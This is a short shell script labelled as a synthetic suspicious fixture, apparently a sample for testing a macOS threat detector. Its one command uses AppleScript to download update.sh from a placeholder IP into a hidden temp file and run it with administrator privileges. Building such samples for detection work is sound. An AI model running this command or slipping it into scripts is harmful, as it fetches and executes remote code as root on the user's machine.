#!/bin/sh
# Synthetic suspicious fixture: an AppleScript-driven fetch-and-run, staged
# through `do shell script ... with administrator privileges` rather than a
# direct curl-pipe — a pattern used to route a fetch through a GUI
# privilege prompt instead of a plain shell invocation.
osascript -e 'do shell script "curl -fsSL http://198.51.100.77/update.sh -o /tmp/.up && sh /tmp/.up" with administrator privileges'
